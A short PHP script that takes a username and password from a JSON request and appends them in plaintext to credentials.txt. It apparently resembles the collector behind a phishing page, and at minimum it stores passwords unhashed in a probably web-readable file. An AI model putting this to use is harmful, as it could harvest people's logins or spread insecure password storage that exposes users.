<?php
// save_credentials.php
$data = json_decode(file_get_contents("php://input"), true);

if ($data) {
    $username = $data['username'];
    $password = $data['password'];

    // Save to a file
    $file = 'credentials.txt';
    $content = "Username: $username, Password: $password\n";
    file_put_contents($file, $content, FILE_APPEND | LOCK_EX);

    echo 'Credentials saved successfully!';
} else {
    echo 'No data received!';
}
?>
